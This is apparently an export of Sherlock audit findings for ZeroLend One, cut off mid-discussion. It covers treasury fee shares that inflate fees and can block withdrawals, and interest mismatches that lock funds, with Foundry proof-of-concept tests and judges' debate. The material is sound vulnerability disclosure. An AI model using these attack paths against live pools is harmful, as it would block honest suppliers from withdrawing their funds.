      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430 \n\n## Found by \n0xAlix2, A2-security, Bigsam, Nihavent, Ocean\\_Sky, trachev\n### Summary\n\nFees on debt interest are calculated in 'assets', but not claimed immediately and stored as shares. When they're claimed, they're treated as regular supplyShares and converted back to assets based on the `liquidityIndex` at the time they're claimed. This results in the realized fees being higher than expected, and under an extreme scenario may not leave enough liquidity for regular pool suppliers to withdraw their funds.\n\n### Root Cause\n\nEach time a pool's reserve state is updated, [`ReserveLogic::_accrueToTreasury()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L92).\nThis function incriments `_reserve.accruedToTreasuryShares` by the shares equiavalent of the assets taken as a fee. Note `vars.amountToMint` is in assets, and `_reserve.accruedToTreasuryShares` is stored in shares as the 'fee assets' are not always immediately sent to the treasury.\n\n```javascript\n  function _accrueToTreasury(uint256 reserveFactor, DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\n    ... SKIP!...\n\n    vars.amountToMint = vars.totalDebtAccrued.percentMul(reserveFactor); // Assets\n\n@>  if (vars.amountToMint != 0) _reserve.accruedToTreasuryShares += vars.amountToMint.rayDiv(_cache.nextLiquidityIndex).toUint128(); // Shares\n  }\n```\n\nWhen any pool withdrawal is executed, [`PoolLogic::executeMintToTreasury()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolSetters.sol#L84). The stored shares are converted back to assets based on the current `liquidityIndex`:\n\n```javascript\n  function executeMintToTreasury(\n    DataTypes.ReserveSupplies storage totalSupply,\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    address treasury,\n    address asset\n  ) external {\n    DataTypes.ReserveData storage reserve = reservesData[asset];\n\n    uint256 accruedToTreasuryShares = reserve.accruedToTreasuryShares;\n\n    if (accruedToTreasuryShares != 0) {\n      reserve.accruedToTreasuryShares = 0;\n      uint256 normalizedIncome = reserve.getNormalizedIncome();\n      uint256 amountToMint = accruedToTreasuryShares.rayMul(normalizedIncome); // Assets, scaled up by current liquidityIndex\n\n      IERC20(asset).safeTransfer(treasury, amountToMint);\n      totalSupply.supplyShares -= accruedToTreasuryShares;\n\n      emit PoolEventsLib.MintedToTreasury(asset, amountToMint);\n    }\n  }\n```\n\nAs a result, the actual fee taken by the treasury exceeds the original x% intended by `reserveFactor` at the time the debt was repaid.\n\nIn addition, the accumulation of interest on these `accruedToTreasuryShares` can lead to pool withdrawals being DOSed under circumstances where the `_updateIndexes()` is called close to every second to create a compounding effect. This compounding effect on brings the `liquidityIndex` closer to the `borrowIndex`. This results in the interest earned on `accruedToTreasuryShares` causing the pool to run out of liquidity when suppliers withdraw.\n\n### Internal pre-conditions\n\nImpact 1 \n1. A pool has a non-zero `reserveFactor`\n2. Pool operates normally with supplies/borrows/repays\n\nImpact 2\n1. A pool has a non-zero `reserveFactor`\n2. Pool operates normally with supplies/borrows/repays\n3. `_updateIndexes()` is called each second (or close to)\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nImpact 2\n1. User1 supplies to a pool\n2. User2 borrows from the same pool\n3. As time elapses, `_updateIndexes()` is called close to every second, bringing `liquidityIndex` closer to `borrowIndex`. Note this is callable from an external function `Pool::forceUpdateReserves()`\n4. User2 repays their borrow including interest\n5. Repeat step 3 just for a few seconds\n6. User1 attempts to withdraw their balance but due to the accrued interest on `accruedToTreasuryShares`, the pool runs out of liquidity DOSing the withdrawal.\n\n### Impact\n\n1. Generally speaking, in all pools the treasury will end up taking a larger fee than what was set in `reserveFactor`. That is, if `reserveFactor` is 1e3 (10%) and 1e18 interest is earned, the protocol will eventually claim more than 10% * 1e18 assets.\n2. Under a specific scenario where `_updateIndexes()` is called every second, there will not be enough liquidity for suppliers to withdraw because the treasury earning supply interest on their `accruedToTreasuryShares` is not accounted for.\n\n### PoC\n\nThe below coded POC implements the 'Attack Path' described above.\n\nFirst, add this line to the `CorePoolTests::_setUpCorePool()` function to create a scenario with a non-zero reserve factor:\n\n```diff\n  function _setUpCorePool() internal {\n    poolImplementation = new Pool();\n\n    poolFactory = new PoolFactory(address(poolImplementation));\n+   poolFactory.setReserveFactor(1e3); // 10%\n    configurator = new PoolConfigurator(address(poolFactory));\n\n    ... SKIP!...\n  }\n```\n\nThen, create a new file on /test/forge/core/pool and paste the below contents.\n\n```javascript\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {console2} from 'forge-std/src/Test.sol';\nimport {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';\n\ncontract AuditHighSupplyRateDosWithdrawals is PoolLiquidationTest {\n\nfunction test_POC_DosedWithdrawalsDueToTreasurySharesAccruing() public {\n    uint256 aliceMintAmount = 10_000e18;\n    uint256 bobMintAmount = 10_000e18;\n    uint256 supplyAmount = 1000e18;\n    uint256 borrowAmount = 1000e18;\n\n    _mintAndApprove(alice, tokenA, aliceMintAmount, address(pool));         // alice collateral\n    _mintAndApprove(bob, tokenB, bobMintAmount, address(pool));             // bob supply\n    _mintAndApprove(alice, tokenB, aliceMintAmount, address(pool));         // alice needs some funds to pay interest\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmount, 0); \n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, aliceMintAmount, 0);  // alice collateral\n    pool.borrowSimple(address(tokenB), alice, borrowAmount, 0);     // 100% utilization\n    vm.stopPrank();\n\n    for(uint256 i = 0; i < (12 * 60 * 60); i++) { // Each second `_updateIndexes()` is called via external function `forceUpdateReserves()`\n        vm.warp(block.timestamp + 1);\n        pool.forceUpdateReserves();\n    }\n\n    // Alice full repay\n    vm.startPrank(alice);\n    tokenB.approve(address(pool), type(uint256).max);\n    pool.repaySimple(address(tokenB), type(uint256).max, 0);\n    uint256 post_aliceTokenBBalance = tokenB.balanceOf(alice);\n    uint256 interestRepaidByAlice = aliceMintAmount - post_aliceTokenBBalance;\n\n    for(uint256 i = 0; i < (60); i++) { // warp after for treasury to accrue interest on their 'fee shares' \n        vm.warp(block.timestamp + 1);\n        pool.forceUpdateReserves();\n    }\n\n    // Check debt has been repaid\n    (, , , uint256 debtShares) = pool.marketBalances(address(tokenB));\n    assert(debtShares == 0); // All debt has been repaid\n\n    // Treasury assets to claim\n    uint256 treasuryAssetsToClaim = pool.getReserveData(address(tokenB)).accruedToTreasuryShares * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Bob's assets to claim\n    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));\n    uint256 bobsAssets = pool.supplyShares(address(tokenB), bobPos) * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Impact 1: the interest claimable by the treasury is greater than 10% of the interest repaid\n    assert(treasuryAssetsToClaim > pool.factory().reserveFactor() * interestRepaidByAlice / 1e4);\n\n    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. \n    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.\n    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report\n    uint256 poolLiquidity = tokenB.balanceOf(address(pool));\n    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); \n  }\n}\n```\n\n### Mitigation\n\nThree possible solutions:\n1. Immediately send the 'fee assets' to treasury rather than accruing them over time\n2. Store the 'fee assets' in assets instead of shares. This will correctly capture the amount of fee that is intended by `reserveFactor`. For example if a fee is 10%, the protocol will take exactly 10% of the interest earned on debt.\n3. Account for the creation of new `supplyShares` by diluting the `liquidityIndex` upon creating these shares. This solution will allow the conversion back to assets in `executeMintToTreasury()` to remain unchanged.\n   - Note I acknowledge that the [calculation of `liquidityRate`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/periphery/ir/DefaultReserveInterestRateStrategy.sol#L126-L128) does account for `reserveFactor`, however given this is out of scope I did not focus on it. Regardless, it does not scale the rate down enough to account for the interest the treasury will earn on these shares. \n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  Invalid: fees can accrue interest as well as is done in AAVE\n\n\n\n**Honour-d-dev**\n\nEscalate\n\nThis issue is invalid and is different from the #16 #220 #267 #317 group\n#240 is not in the above group\n\n`accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> This issue is invalid and is different from the #16 #220 #267 #317 group\n> #240 is not in the above group\n> \n> `accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Nihavent**\n\n> Escalate\n> \n> This issue is invalid and is different from the #16 #220 #267 #317 group #240 is not in the above group\n> \n> `accruedToTreasuryShares` should earn supply interest, it is accounted for in the interest calculations and is the exact same way aave works as well.\n\nThis report focuses on the edge case regarding frequent calls of `_updateIndexes()` however it still demonstrates a withdrawal DOSed due to insufficient liquidity (see impact 2 on the POC and associated comment):\n\nExcerpt from POC:\n\n```javascript\n    ... \n\n    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. \n    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.\n    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report\n    uint256 poolLiquidity = tokenB.balanceOf(address(pool));\n    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); \n```\n\nIf you have any doubt that this is due to the transfer of assets to treasury, you could add the following assert statement showing sufficient liquidity to withdraw if we remove the treasury asset transfer:\n\n```diff\n    ...\n\n    // Impact 2: Bob & the treasury's claim on the assets is greater than available assets, despite no outstanding debt. \n    // This assert demonstrates that bob's withdrawal would be DOSed as withdrawal calls include a transfer of treasury assets.\n    // The withdrawal DOS cannot be shown due to the call reverting due to the 'share underflow' issue described in another report\n    uint256 poolLiquidity = tokenB.balanceOf(address(pool));\n    assert(bobsAssets + treasuryAssetsToClaim > poolLiquidity); \n+   assert(bobsAssets <= poolLiquidity);\n```\n\n<ins>This is exactly the same root cause as the family of issues you listed, thus they should remain grouped.</ins> \nMy understanding is in Sherlock duplication rules, valid duplicates do not need to identify the primary attack path.\n\nThis report also discusses interest accruing on minted treasury shares results in more than the `reserveFactor` being claimed by the treasury (see impact 1 in the POC). As mentioned in the mitigations, this could be fixed by sending the fees in assets to the treasury upon debt repayment instead of minting the treasury shares which accrue over time. \nIf this change was implemented it would also mitigate the DOSed withdrawals because a withdrawal would not revert when the pool has just enough liquidity to service the withdrawn assets. \n\nFinally, the point you make about AAVE accruing interest on treasury shares is not directly applicable to Zerolend because AAVE have removed `executeMintToTreasury()` from the pool withdraw flow [shown here](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/pool/Pool.sol#L196-L216) [and here](https://github.com/aave/aave-v3-core/blob/782f51917056a53a2c228701058a6c3fb233684a/contracts/protocol/libraries/logic/SupplyLogic.sol#L106-L163). \nAs a result, AAVEE need not worry about treasury fees being stored in shares because they won't DOS withdrawals.\n\n\nEDIT: for clarity I do conceed that impact 1 of this report by itself is low/info severity. But the fix for impact 1 also fixes DOSed withdrawals so it's closely related to impact 2 which is medium severity and matches the grouped family.\n\n**cvetanovv**\n\nI agree with @Nihavent comment that this issue can remain a duplicate with the others because it has caught the root cause, which the other issues have reported, and the second impact is the same as the other issues(withdrawal DoS).\n\nAlso, from the escalation, I agree that #240 does not belong in this group but in the #101 group.\n\nPlanning to reject the escalation of this issue(#430) to be invalid, but I'll duplicate #240 with #101.\n\n**0xSpearmint**\n\n@cvetanovv This issue is invalid.\n\nThe root cause of this issue as described by the watsons is that `executeMintToTreasury ` will revert when a user attempts to withdraw all the liquidity from a pool.\n\nThis is intended, consider the following scenario that assumes a 10% reserve factor:\n\n1. Lender lends 10 ETH\n2. Borrower borrows 10 ETH\n3. Later the borrower repays 5 ETH + 1 ETH interest (0.1ETH belongs to the treasury)\n4. Currently there is 6 ETH in the pool, If the lender attempts to withdraw 6 ETH it will revert **which is intended** because 0.1 ETH belongs to the treasury\n5. The lender can withdraw 5.9 ETH and have no issues\n\nWhile the 0.1 ETH is in the pool, it is not available liquidity for lenders to withdraw. It is reserved for the treasury\n\n**Nihavent**\n\n>”4. Currently there is 6 ETH in the pool, If the lender attempts to withdraw 6 ETH it will revert which is intended because 0.1 ETH belongs to the treasury”\n\nIn this example the lender has supply shares equal in value to 10.9 ETH, why should a withdrawal of 6 ETH revert when the pool has 6 ETH of liquidity? \nYes the treasury holds supply shares equal to 0.1 ETH. These supplyShares are the same as any other supplyShares and should not need to be provisioned for in every single withdrawal. \n\nWhat if treasuryShares are worth 2 ETH, a pool has 3 ETH of liquidity and a user who holds supplyShares worth 2 ETH attempts to withdraw 2 ETH. Why should this revert? \n\n\n>”The root cause of this issue as described by the watsons is that executeMintToTreasury  will revert when a user attempts to withdraw all the liquidity from a pool.”\n\nNot necessarily, the example I just gave shows a user attempting to withdraw less than all the liquidity available and still facing a revert. \n\n\nNote that Aave fixed this issue by removing ‘executeMintToTreasury’ from the withdrawal flow as I described [here](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430#issuecomment-2395198139)\n\n**0xjuaan**\n\nThe pool has 6 ETH worth of liquidity, but 0.1 ETH is **reserved** for the treasury. Due to the **reserve** factor of 10%. Clearly these funds meant for the treasury should not be withdrawable by lenders.  \n\n**Nihavent**\n\n>” Clearly these funds meant for the treasury should not be withdrawable by lenders.”\n\nIt is completely misleading to suggest that lenders are trying to withdraw treasury funds. They’re only trying to withdraw <ins>their funds</ins>. \n\nThe issue is clearly visible in pools with low liquidity and accumulating treasury fees such as this example:\n\n>” What if treasuryShares are worth 2 ETH, a pool has 3 ETH of liquidity and a user who holds supplyShares worth 2 ETH attempts to withdraw 2 ETH.”\n\nWhere a withdrawal of any amount exceeding 1 ETH is DOSed until a repayment/deposit is made that covers the withdrawal amount and all treasury fees (which continue to accumulate). Note if the asset value of the treasury shares exceeds the available liquidity in the pool all withdrawals are DOSed. \n\nIt seems like you’re making the variable name ‘reserveFactor’ do too much work. If these funds were truly intended to be reserved, they would not be borrowable. \n\nThis issue was fixed in Aave for a reason, I’m yet to see a compelling argument why it’s not an issue in Zerolend \n\n\n**cvetanovv**\n\nI believe this issue and its duplicates (excluding #240) are valid because the accumulation of treasury fees could ultimately result in a situation where all withdrawals from the pool are DOSed. \n\nThis occurs when the total accrued treasury fees exceed the available liquidity in the pool, thereby preventing suppliers from withdrawing their assets until the pool is replenished.\n\nAs @Nihavent has pointed out,  Aave resolved this issue by excluding ‘executeMintToTreasury’ from the withdrawal flow.\n\nMy previous decision to reject escalation remains. I will only invalidate #240\n\n**0xSpearmint**\n\n@cvetanovv The treasury fees is 10% of the interest paid on loans. This is orders of magnitude smaller than the principal liquidity of the pool. It is not realistic at all for the treasury fees to exceed the available liquidity in the pool unless the pool has > 99% utilization so there is barely anything left. This edge case will not last long at all since the borrower will have a huge interest rate to pay so the DOS will be well below 7 days and the lenders will receive huge yield for that period.\n\nFurthermore every time a single successful withdrawal occurs, the treasury fees reset to 0. This makes it even harder to accumulate an amount to cause a DOS.\n\n**Nihavent**\n\n>\"It is not realistic at all for the treasury fees to exceed the available liquidity in the pool unless the pool has > 99% utilization so there is barely anything left. This edge case will not last long at all since the borrower will have a huge interest rate to pay so the DOS will be well below 7 days and the lenders will receive huge yield for that period.\"\n\nYour comment is making a lot of assumptions given high utilization is a completely valid pool state. There are a variety of IRMs and varying incentives for users.\n\n- There may be pools using `DefaultInterestRateStrategy` where the 'debtSlope' settings are not high enough. In these pools, the utilization has minimal impact on rates and users have little incentive to repay quickly.\n- Even if this isn't the case, higher utilization results in more interest repaid which results in more treasury fees which further increases the minimum deposit or repayment required to un-dos withdrawals. \n- Not all IRMs increase rates as a function of utilization, we can see the codebase has plans for a `FixedInterestRateStrategy`. Your comment gives no consideration to extended DOS in pools with fixed rate stratergies. \n\n>\"Furthermore every time a single successful withdrawal occurs, the treasury fees reset to 0. This makes it even harder to accumulate an amount to cause a DOS.\"\n\nThe issue is no withdrawal can occur when accumulated treasury shares exceed pool liquidity. \n\n**cvetanovv**\n\nI agree with @Nihavent comment, and my previous decision remains: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430#issuecomment-2435074872\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430/#issuecomment-2392041769): rejected",
      "summary": "\nThis report discusses a bug found in Zerolend that results in higher than expected treasury fees and, under rare circumstances, can cause a denial of service for pool withdrawals. The root cause of the issue is that fees on debt interest are calculated in 'assets' but not claimed immediately, resulting in higher than expected fees. This also leads to a situation where there may not be enough liquidity for regular pool suppliers to withdraw their funds. The bug has been identified by multiple security researchers and has been found to be the same root cause as other reported issues. The suggested fix for this issue is to send the fees in assets to the treasury upon debt repayment instead of minting treasury shares, which accrue over time. This would also mitigate the DOSed withdrawals. The issue has been resolved and marked as a valid duplicate of other similar issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/430",
      "tags": [],
      "finders": [
        "Nihavent",
        "trachev",
        "0xAlix2",
        "A2-security",
        "Ocean\\_Sky",
        "Bigsam"
      ]
    },
    {
      "id": "41831",
      "title": "M-10: Unclaimable reserve assets will accrue in a pool due to the difference between interest paid on borrows and interest earned on supplies",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/429 \n\n## Found by \nNihavent, iamnmt\n### Summary\n\nThe interest paid on borrows is calculated in a compounding fashion, but the interest earned on supplying assets is calculated in a fixed way. As a result more interest will be repaid by borrowers than is claimable by suppliers. This buildup of balance never gets rebased into the `liquidityIndex`, nor is it claimable with some sort of 'skim' function.\n\n### Root Cause\n\nAny time an action calls `ReserveLogic::updateState()`, [`ReserveLogic::_updateIndexes()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L91).\n\nIn `_updateIndexes()`, the `_cache.nextLiquidityIndex` is a [scaled up](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L226) version of `_cache.currLiquidityIndex` based on the 'linear interest' [calculated in `MathUtils::calculateLinearInterest()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225).\n\n[`calculateLinearInterest`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L34-L42) scales a fixed interest annual interest rate by the amount of time elapsed since the last call:\n\n```javascript\n  function calculateLinearInterest(uint256 rate, uint40 lastUpdateTimestamp) internal view returns (uint256) {\n    //solium-disable-next-line\n    uint256 result = rate * (block.timestamp - uint256(lastUpdateTimestamp));\n    unchecked {\n      result = result / SECONDS_PER_YEAR;\n    }\n\n    return WadRayMath.RAY + result;\n  }\n```\n\n\nSimilarly, the `_cache.nextBorrowIndex` is a [scaled up](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L236) version of `_cache.currBorrowIndex` based on the 'compound interest' [calculated in `MathUtils::calculateCompoundedInterest()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L235).\n\n[`calculateCompoundedInterest`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/utils/MathUtils.sol#L58C12-L89) compounds a rate based on the time elapsed since it was last called:\n\n```javascript\n  function calculateCompoundedInterest(uint256 rate, uint40 lastUpdateTimestamp, uint256 currentTimestamp) internal pure returns (uint256) {\n    //solium-disable-next-line\n    uint256 exp = currentTimestamp - uint256(lastUpdateTimestamp);\n\n    if (exp == 0) {\n      return WadRayMath.RAY;\n    }\n\n    uint256 expMinusOne;\n    uint256 expMinusTwo;\n    uint256 basePowerTwo;\n    uint256 basePowerThree;\n    unchecked {\n      expMinusOne = exp - 1;\n      expMinusTwo = exp > 2 ? exp - 2 : 0;\n\n      basePowerTwo = rate.rayMul(rate) / (SECONDS_PER_YEAR * SECONDS_PER_YEAR);\n      basePowerThree = basePowerTwo.rayMul(rate) / SECONDS_PER_YEAR;\n    }\n\n    uint256 secondTerm = exp * expMinusOne * basePowerTwo;\n    unchecked {\n      secondTerm /= 2;\n    }\n    uint256 thirdTerm = exp * expMinusOne * expMinusTwo * basePowerThree;\n    unchecked {\n      thirdTerm /= 6;\n    }\n\n    return WadRayMath.RAY + (rate * exp) / SECONDS_PER_YEAR + secondTerm + thirdTerm;\n  }\n```\n\nAs a result, more interest is payable on debt than is earned on supplied liquidity. This is a design choice by the protocol, however without a function to 'skim' this extra interest, these tokens will buildup and are locked in the protocol. \n\n### Internal pre-conditions\n\n1. Pool operates normally with supplies/borrows/repays\n2. `updateState()` must NOT be called every second, as this would create a compounding-effect on the 'linear rate' such that the difference in interest paid on debts is equal to the interest earned on supplies.\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Several users supply tokens to a pool as normal\n2. Users borrow against the liquidity\n3. Time passes, all borrows are repaid\n4. All suppliers withdraw their funds (as part of this operation the treasury also withdraws their fee assets)\n5. A pool remains with 0 supplyShares and 0 debtShares, but still has a token balance which is unclaimable by anyone\n\n### Impact\n\n1. Token buildup in contract is unclaimable by anyone\n   - The built up token balance can be borrowed and flash loaned, leading to compounding build up of unclaimable liquidity\n\n\n### PoC\n\nCreate a new file in /test/forge/core/pool and paste the below contents. The test shows a simple supply/borrow/warp/repay flow. After the actions are complete, the pool has more `tokenB` than is claimable by the supplier and the treasury. These tokens are now locked in the contract \n\n```javascript\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {console2} from 'forge-std/src/Test.sol';\nimport {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';\n\ncontract AuditUnclaimableBalanceBuildupOnPool is PoolLiquidationTest {\n\n  function test_POC_UnclaimableBalanceBuildupOnPool () public {\n    uint256 aliceMintAmount = 10_000e18;\n    uint256 bobMintAmount = 10_000e18;\n    uint256 supplyAmount = 1000e18;\n    uint256 borrowAmount = 1000e18;\n\n    _mintAndApprove(alice, tokenA, aliceMintAmount, address(pool));         // alice collateral\n    _mintAndApprove(bob, tokenB, bobMintAmount, address(pool));             // bob supply\n    _mintAndApprove(alice, tokenB, aliceMintAmount, address(pool));         // alice needs some funds to pay interest\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmount, 0); \n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, aliceMintAmount, 0);  // alice collateral\n    pool.borrowSimple(address(tokenB), alice, borrowAmount, 0);     // 100% utilization\n    vm.stopPrank();\n\n    vm.warp(block.timestamp + 365 days); // Time passes, interest accrues, treasury shares accrue\n    pool.forceUpdateReserves();\n\n    // Alice full repay\n    vm.startPrank(alice);\n    tokenB.approve(address(pool), type(uint256).max);\n    pool.repaySimple(address(tokenB), type(uint256).max, 0);\n\n    (,,, uint256 debtShares) = pool.marketBalances(address(tokenB));\n    // All debt has been repaid\n    assert(debtShares == 0); \n\n    // Bob's claim on pool's tokenB\n    bytes32 bobPos = keccak256(abi.encodePacked(bob, 'index', uint256(0)));\n    uint256 BobsMaxWithdrawAssets = pool.supplyShares(address(tokenB), bobPos) * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Treasury claim on pool's tokenB\n    uint256 accruedTreasuryAssets = pool.getReserveData(address(tokenB)).accruedToTreasuryShares * pool.getReserveData(address(tokenB)).liquidityIndex / 1e27;\n\n    // Total balance of pool's tokenB\n    uint256 poolTokenBBalance = tokenB.balanceOf(address(pool));\n\n    assert(poolTokenBBalance > BobsMaxWithdrawAssets + accruedTreasuryAssets); // There are more tokenB on the pool than all suppliers + treasury claim. \n  }\n\n}\n```\n\n### Mitigation\n\nOne option is to create a function which claims the latent funds to the treasury, callable by an owner\n- Calls `forceUpdateReserves()`\n- Calls `executeMintToTreasury()`\n- Calculates the latent funds on a pool's reserve (something like `tokenA.balanceOf(pool) - ( totalSupplyShares * liquidityIndex )`)\n- Sends these funds to the treasury\n\nAnother option would be to occasionally rebase `liquidityIndex` to increase the value of supplyShares so supplies have a claim on these extra funds.\n\nIn both cases it may be sensible to leave some dust as a buffer. \n\n\n\n## Discussion\n\n**0xspearmint1**\n\nescalate\n\nThis issue is invalid for multiple reasons\n\n1. The condition for this issue as stated by the watson is that `updateState()` must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call `updateState()`. In the POC they provided, it involves not calling `updateState()` for 365 days after borrowing funds.\n\n2. Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) requires the following:\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n\nNo user experiences a loss in this issue\n1. Lenders receive the correct interest rate\n2. Borrowers pay the correct borrow rate\n\n**sherlock-admin3**\n\n> escalate\n> \n> This issue is invalid for multiple reasons\n> \n> 1. The condition for this issue as stated by the watson is that `updateState()` must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call `updateState()`. In the POC they provided, it involves not calling `updateState()` for 365 days after borrowing funds.\n> \n> 2. Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) requires the following:\n> >Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n> \n> No user experiences a loss in this issue\n> 1. Lenders receive the correct interest rate\n> 2. Borrowers pay the correct borrow rate\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Nihavent**\n\n>\"1. The condition for this issue as stated by the watson is that updateState() must NOT be called regularly. This is totally unrealistic since any any action (supply, borrow, withdraw, repay, etc) will call updateState(). In the POC they provided, it involves not calling updateState() for 365 days after borrowing funds.\"\n\nThe escalation comment misquoted the report saying \"updateState() must NOT be called regularly\" when the report states \"updateState() must NOT be called every second\". These are meaningfully different statements because the impact is present when updateState() is called as frequently as 2 seconds, which is more frequently than what would be expected in most pool/asset combinations.\n\nThe elapsed time between `updateState()` calls is completely arbitrary and in the POC I used 365 days as a matter of habbit. See adjusted POC below where <u>instead of warping 365 days, we warp just 2 seconds and the test still passes</u>:\n\n```diff\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport {console2} from 'forge-std/src/Test.sol';\nimport {PoolLiquidationTest} from './PoolLiquidationTests.t.sol';\n\ncontract AuditUnclaimableBalanceBuildupOnPool is PoolLiquidationTest {\n\n    ...\n\n-   vm.warp(block.timestamp + 365 days); // Time passes, interest accrues, treasury shares accrue\n+   vm.warp(block.timestamp + 2 seconds); // Time passes, interest accrues, treasury shares accrue\n    pool.forceUpdateReserves();\n\n    ...\n  }\n\n}\n```\n\n```javascript\nRan 1 test for test/forge/core/pool/UnclaimableBalanceBuildupOnPool.t.sol:AuditUnclaimableBalanceBuildupOnPool\n[PASS] test_POC_UnclaimableBalanceBuildupOnPool() (gas: 811472)\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.18ms (1.08ms CPU time)\n```\n\n\n>\"2. Sherlock's criteria for a medium issue requires the following:\n>\n>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n>\n>No user experiences a loss in this issue\n>\n>Lenders receive the correct interest rate\n>Borrowers pay the correct borrow rate\"\n\nFunds locked in the contract must be considered lost because they are permanently unretrievable. \n\nThe amount locked (lets call it surpluss) increases every time debt is repaid. Over time it's reasonable to expect a signficiant portion of all a pool's assets will be surpluss and not claimable by anyone.\n\nThe value of locked funds will clearly exceed 10 USD as there will usually be several percentage points difference between the indexes. This of course will vary depending on the frequency of `updateState()` calls. If this needs to be quantified I would be happy to help, but it clearly exceeds dust values.\n\nFinally, we can refer to the [Sherlock standards](https://github.com/sherlock-protocol/sherlock-v2-docs/blob/e7dc89270b05f8d2fcee69dc4204c7a2b8fb4cf9/audits/judging/judging/README.md?plain=1#L43-L47) to determine that permanent locked funds constitutes a valid issue:\n\n>\"2. **Could Denial-of-Service (DOS), griefing, or locking of contracts count as a Medium (or High) issue?** DoS has two separate scores on which it can become an issue:\n>   1. The issue causes locking of funds for users for more than a week.\n>   2. The issue impacts the availability of time-sensitive functions (cutoff functions are not considered time-sensitive).\n>If at least one of these are describing the case, the issue can be a Medium. If both apply, the issue can be considered of High severity. Additional constraints related to the issue may decrease its severity accordingly. \\\n>Griefing for gas (frontrunning a transaction to fail, even if can be done perpetually) is considered a DoS of a single block, hence only if the function is clearly time-sensitive, it can be a Medium severity issue.\"\n\n\n**cvetanovv**\n\nFor me, this issue is borderline Medium/Low. Because of this, we have to look at Sherlock's rules.\n\nThese 